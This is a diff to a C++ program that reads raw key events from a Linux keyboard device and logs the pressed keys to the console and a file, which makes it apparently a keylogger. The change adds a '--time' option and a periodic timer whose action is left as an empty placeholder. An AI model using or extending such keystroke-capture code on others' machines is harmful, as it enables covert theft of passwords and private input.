@@ -57,6 +57,13 @@ int main(int argc, char **argv)
     if(!fleObj.is_open() && isFile)
         throw std::runtime_error("Error while opening the given log file");
 
+    int timeInterval = 4;
+    if(args >> GetOpt::OptionPresent('t', "time"))
+    {
+        args >> GetOpt::Option('t', "time", timeInterval, 4);
+    }
+    TimerUnit timeController(timeInterval);
+
     while(read(kbd_Fd, &eve, sizeof(input_event)) > 0)
     {
         if(eve.type == EV_KEY)
@@ -77,6 +84,9 @@ int main(int argc, char **argv)
             std::cout << keyWord << std::endl;
         if(isFile && eve.value == KEY_PRESS && eve.type == EV_KEY)
             fleObj << keyWord;
+
+        if(timeController.checkTime())
+            ;//do something
     }
     close(kbd_Fd);
     fleObj.close();
